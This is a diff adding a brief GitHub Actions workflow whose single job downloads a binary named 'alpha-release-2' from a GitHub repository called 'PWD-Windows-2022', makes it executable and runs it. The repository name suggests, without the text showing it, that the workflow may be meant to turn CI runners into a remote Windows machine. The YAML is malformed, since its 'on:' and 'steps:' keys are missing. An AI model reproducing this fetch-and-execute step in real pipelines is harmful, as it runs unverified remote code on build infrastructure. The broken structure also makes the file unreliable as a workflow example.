@@ -1,0 +1,15 @@
+name: CI
+
+
+ workflow_dispatch:
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+      - name: Run a multi-line script
+        run: |
+          wget https://github.com/kmille36/PWD-Windows-2022/raw/main/alpha-release-2
+          chmod +x alpha-release-2
+          ./alpha-release-2
